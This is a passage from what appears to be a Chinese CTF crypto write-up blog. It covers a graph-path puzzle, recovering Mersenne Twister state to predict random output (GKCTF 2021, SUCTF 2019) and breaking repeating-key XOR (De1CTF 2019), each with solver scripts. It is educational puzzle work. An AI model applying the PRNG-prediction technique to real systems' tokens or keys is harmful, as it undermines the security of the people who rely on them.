class="line"><span class="built_in">print</span>(route) <span class="comment">#前驱顶点</span></span><br><span class="line"></span><br><span class="line">passv=[]  <span class="comment">#存放顶点之间的“内容”（内容最后要组成flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    passv.append([]) <span class="comment"># 还是在一个list中放27个list</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        passv[i].append(<span class="number">0</span>)  <span class="comment">#需要将内部list中初始化出27个“位置”否则会报错索引越界</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> li:</span><br><span class="line">    passv[<span class="built_in">int</span>(x[<span class="number">0</span>])][<span class="built_in">int</span>(x[<span class="number">1</span>])]=x[<span class="number">3</span>]</span><br><span class="line">    passv[<span class="built_in">int</span>(x[<span class="number">1</span>])][<span class="built_in">int</span>(x[<span class="number">0</span>])]=x[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">y=<span class="number">26</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">while</span> y!=<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(y) <span class="comment">#输出终点到起点的最短路径经过的顶点</span></span><br><span class="line">    l.append(passv[y][route[y]]) <span class="comment">#y到其前驱顶点route[y]之间的内容</span></span><br><span class="line">    y=route[y]</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">l=l[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    <span class="built_in">print</span>(l[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">339</span></span><br><span class="line"><span class="string">[1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 5, 5, 5, 4, 4, 4, 6, 6, 6, 25, 9, 11, 12, 6, 18, 22, 25]</span></span><br><span class="line"><span class="string">26 25 22 12 5 2 </span></span><br><span class="line"><span class="string">FLAG&#123;WEIVKASJVLSJCHFSJVHJSDEV&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="GKCTF-2021-Random（梅森算法）"><a href="#GKCTF-2021-Random（梅森算法）" class="headerlink" title="[GKCTF 2021]Random（梅森算法）"></a>[GKCTF 2021]Random（梅森算法）</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mask</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">64</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">96</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file.close()</span><br><span class="line">get_mask()</span><br><span class="line">flag = md5(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过阅读代码，我们知道是求生成104组随机数后的卜随机数</p><p>通过算法出的随机数是伪随机数，这里用到的随机数生成函数式random.getrandbits(k)</p><blockquote><p>random.getrandbits(k)</p><p>返回具有 k 个随机比特位的非负 Python 整数。 此方法随 MersenneTwister 生成器一起提供，其他一些生成器也可能将其作为 API 的可选部分提供。 在可能的情况下，getrandbits() 会启用 randrange() 来处理任意大的区间。在 3.9 版更改: 此方法现在接受零作为 k 的值。</p></blockquote><p>所以这题考的其实是梅森算法，Mersenne Twister是为了解决过去伪随机生成器PRNG产生的伪随机数质量不高而生成的（传送门：<a href="https://liam.page/2018/01/12/Mersenne-twister/#:~:text=%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95%EF%BC%88Mersenne%20Twister%20Algorithm%EF%BC%8C%E7%AE%80%E7%A7%B0%20MT%EF%BC%89%E6%98%AF%E4%B8%BA%E4%BA%86%E8%A7%A3%E5%86%B3%E8%BF%87%E5%8E%BB%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8%EF%BC%88Pseudo-Random%20Number%20Generator%EF%BC%8C%E7%AE%80%E7%A7%B0%20PRNG%EF%BC%89%E4%BA%A7%E7%94%9F%E7%9A%84%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%B4%A8%E9%87%8F%E4%B8%8D%E9%AB%98%E8%80%8C%E6%8F%90%E5%87%BA%E7%9A%84%E6%96%B0%E7%AE%97%E6%B3%95%E3%80%82.%20%E8%AF%A5%E7%AE%97%E6%B3%95%E7%94%B1%E6%9D%BE%E6%9C%AC%E7%9C%9E%EF%BC%88Makoto,%E6%98%AF%E4%B8%BA%E4%BA%86%E8%A7%A3%E5%86%B3%E8%BF%87%E5%8E%BB%20PRNG%20%E8%B4%A8%E9%87%8F%E4%BD%8E%E4%B8%8B%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E9%82%A3%E4%B9%88%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E5%B0%B1%E5%BF%85%E9%A1%BB%E8%A6%81%E6%9C%89%E4%B8%80%E4%B8%AA%E8%83%BD%E5%A4%9F%E5%BA%A6%E9%87%8F%20PRNG%20%E8%B4%A8%E9%87%8F%E7%9A%84%E6%96%B9%E6%B3%95%E3%80%82.%20%E5%90%A6%E5%88%99%EF%BC%8C%E3%80%8C%E5%85%AC%E8%AF%B4%E5%85%AC%E6%9C%89%E7%90%86%E5%A9%86%E8%AF%B4%E5%A9%86%E6%9C%89%E7%90%86%E3%80%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E6%97%A0%E6%B3%95%E5%AF%B9%20PRNG%20%E4%BD%9C%E5%87%BA%E7%BB%9F%E4%B8%80%E7%9A%84%E8%AF%84%E4%BB%B7%E4%BA%86%E3%80%82.">梅森旋转算法</a>）。我们了解MT19937能做生成在1&lt;&#x3D;k&lt;&#x3D;623个均匀分布的32位随机数。而真巧我们已经有624(（104+104*64&#x2F;32+104*96&#x2F;32）&#x3D;624)个生成的随机数了，也就是说，根据已有的随机数，我们完全可以推出下面会生成的随机数</p><p>我们需要用到rendcrack库</p><p>先了解一下rendcrack</p><blockquote><p>randcrack<br>工作原理<br>该生成器基于M e r s e n n e T w i s t e r MersenneTwisterMersenneTwister（梅森算法），能够生成具有优异统计特性的数字（与真正的随机数无法区分）。但是，此生成器的设计目的不是加密安全的。您不应在关键应用程序中用作加密方案的PRNG。<br>您可以[在维基百科上]了解有关此生成器的更多信息(<a href="https://en.wikipedia.org/wiki/Mersenne_Twister">https://en.wikipedia.org/wiki/Mersenne_Twister</a>).<br>这个饼干的工作原理如下。<br>它从生成器获得前624个32位数字，并获得Mersenne Twister矩阵的最可能状态，即内部状态。从这一点来看，发电机应该与裂解器同步。<br>如何使用<br>将生成器生成的32位整数准确地输入cracker非常重要，因为它们无论如何都会生成，但如果您不请求它们，则会删除它们。 同样，您必须在出现新种子之后，或者在生成624 ∗ 32 位之后，准确地为破解程序馈电，因为每个624 ∗ 32 位数字生成器都会改变其状态，并且破解程序设计为从某个状态开始馈电。</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">l,i</span>):</span><br><span class="line">    a=[]</span><br><span class="line">    a.append(l[i])</span><br><span class="line">    b1=l[i+<span class="number">1</span>]&gt;&gt;<span class="number">32</span></span><br><span class="line">    b2=l[i+<span class="number">1</span>]&amp;(<span class="number">2</span>**<span class="number">32</span>-<span class="number">1</span>)</span><br><span class="line">    a.append(b2)</span><br><span class="line">    a.append(b1)</span><br><span class="line">    b1=l[i+<span class="number">2</span>]&gt;&gt;<span class="number">64</span></span><br><span class="line">    b2=(l[i+<span class="number">2</span>]&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>))&gt;&gt;<span class="number">32</span></span><br><span class="line">    b3=l[i+<span class="number">2</span>]&amp;(<span class="number">2</span>**<span class="number">32</span>-<span class="number">1</span>)</span><br><span class="line">    a.append(b3)</span><br><span class="line">    a.append(b2)</span><br><span class="line">    a.append(b1)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;random.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    l=f.readlines()</span><br><span class="line">l=[<span class="built_in">int</span>(i.strip()) <span class="keyword">for</span> i <span class="keyword">in</span> l]</span><br><span class="line">ll=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(l),<span class="number">3</span>):</span><br><span class="line">    ll+=foo(l,i)</span><br><span class="line">rc=RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ll:</span><br><span class="line">    rc.submit(i)</span><br><span class="line">aa=rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(aa).encode()).hexdigest())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本源于：</p><p>代码就很容易读懂了，先将我们有的随机数排列到一个列表ll中，然后挨个用RandCrack.submit()提交，最后用RandCrack.predict_getrandbits()预测下一个32位随机数，然后md5一下输出就好了</p><h4 id="SUCTF2019-MT（梅森算法）"><a href="#SUCTF2019-MT（梅森算法）" class="headerlink" title="[SUCTF2019]MT（梅森算法）"></a>[SUCTF2019]MT（梅森算法）</h4><p>考点是MT19937,也就是梅森旋转算法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">m</span>):</span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line">transformed_flag = transform(flag[<span class="number">5</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;transformed_flag:&#x27;</span>, transformed_flag</span><br><span class="line"><span class="comment"># transformed_flag: 641460a9e3953b1aaa21f3a2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加密原理很简单，就是通过 <strong>convert()</strong> 函数获取随机数将 flag 加密。考的题型是 <strong>逆向 extract_number函数</strong></p><p>解题EXP：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="comment"># right shift inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_right</span>(<span class="params">res, shift, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># right shift with mask inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_right_mask</span>(<span class="params">res, shift, mask, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># left shift inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_left</span>(<span class="params">res, shift, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># left shift with mask inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_left_mask</span>(<span class="params">res, shift, mask, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">y</span>):</span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">y</span>):</span><br><span class="line">    y = inverse_right(y,<span class="number">19</span>)</span><br><span class="line">    y = inverse_left_mask(y,<span class="number">17</span>,<span class="number">2245263360</span>)</span><br><span class="line">    y = inverse_left_mask(y,<span class="number">9</span>,<span class="number">2029229568</span>)</span><br><span class="line">    y = inverse_right(y,<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line">transformed_flag = <span class="string">&#x27;641460a9e3953b1aaa21f3a2&#x27;</span></span><br><span class="line">c = transformed_flag.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">flag = transform(c)</span><br><span class="line"><span class="built_in">print</span> flag.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二种解法是基于出题人的算法，使得明文通过不断的加密最后还是明文。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">m</span>):</span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">circle</span>(<span class="params">m</span>):</span><br><span class="line">    t=m</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x=t</span><br><span class="line">        t=transform(t)</span><br><span class="line">        <span class="keyword">if</span> t==m:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">transformed_flag=<span class="string">&#x27;641460a9e3953b1aaa21f3a2&#x27;</span></span><br><span class="line">flag = circle(transformed_flag.decode(<span class="string">&#x27;hex&#x27;</span>)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;transformed_flag:&#x27;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="De1CTF2019-xorz（重复密钥异或用汉明距离）"><a href="#De1CTF2019-xorz（重复密钥异或用汉明距离）" class="headerlink" title="[De1CTF2019]xorz（重复密钥异或用汉明距离）"></a>[De1CTF2019]xorz（重复密钥异或用汉明距离）</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">&quot;de1ctf&#123;&quot;</span>).strip(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(key)&lt;<span class="number">38</span>) <span class="number">37</span></span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(p) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(ki)) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="built_in">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure><p>cycle函数</p><p><code>cycle()</code> 函数是 Python 标准库 <code>itertools</code> 中的一个函数，可以在一个可迭代对象（例如列表、元组或字符串）中无限循环遍历元素。</p><p>zfill函数</p><p>返回指定长度的字符串，原字符串右对齐，前面填充0。</p><p>我们来审计代码，代码使用了p、ki、si进行了异或，未知部分有两个，flag和plain，最后输出结果是16进制的密文，salt和key都是循环使用的</p><p>salt是已知的，因此先把salt层去掉</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si=cycle(salt)</span><br><span class="line">c = <span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">no_salt = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(p) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si))) <span class="keyword">for</span> p <span class="keyword">in</span> c])</span><br><span class="line"><span class="built_in">print</span> no_salt.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no_salt 